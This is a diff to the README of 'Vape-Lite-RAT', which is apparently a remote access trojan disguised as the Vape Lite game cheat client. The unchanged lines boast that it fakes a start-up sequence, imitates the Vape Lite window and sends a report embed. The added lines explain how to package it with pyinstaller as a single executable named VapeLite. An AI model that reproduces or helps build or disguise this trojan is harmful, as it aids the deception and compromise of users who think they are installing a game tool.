@@ -14,3 +14,7 @@ By using / utilizing Vape-Lite-RAT you agree that you hold responsibility and ac
 - [x] Fakes a start up sequence. (Customizable).
 - [x] Vape Lite window has buttons, and fade in animation.
 - [x] Sends in a fancy embed.
+
+# To build
+``pyinstaller --onefile -n VapeLite`` | https://pyinstaller.readthedocs.io/en/stable/requirements.html
+Auto-py-to-exe | https://pypi.org/project/auto-py-to-exe/
